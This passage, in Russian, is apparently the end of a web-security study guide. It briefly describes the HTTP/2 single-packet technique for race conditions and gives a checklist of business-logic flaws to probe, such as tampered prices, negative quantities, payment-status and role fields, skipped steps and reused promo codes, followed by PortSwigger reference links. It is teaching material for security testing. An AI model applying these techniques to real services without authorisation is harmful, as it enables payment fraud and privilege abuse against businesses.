Техника Single-Packet Attack:
  HTTP/2 + один TCP-пакет → минимальный джиттер
  Все запросы обрабатываются "одновременно"
```

### Шпаргалка Business Logic

```
Что искать:
  [ ] Цена в теле запроса (price, amount, total)
  [ ] Количество (quantity, count, items)
  [ ] Статус оплаты (paid, payment_status, status)
  [ ] Шаги процесса (step, wizard_step, current_step)
  [ ] Роли/флаги (is_admin, role, plan, premium)
  [ ] Скрытые поля форм

Техники:
  [ ] Отрицательные значения
  [ ] Нулевые значения
  [ ] Integer overflow
  [ ] Изменение порядка шагов
  [ ] Повторное применение промокодов
  [ ] Манипуляция скрытыми полями
```

### Дополнительные ресурсы

- [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions)
- [PortSwigger Business Logic](https://portswigger.net/web-security/logic-flaws)
- [Turbo Intruder GitHub](https://github.com/PortSwigger/turbo-intruder)
- [Race Condition Research by James Kettle](https://portswigger.net/research/smashing-the-state-machine)
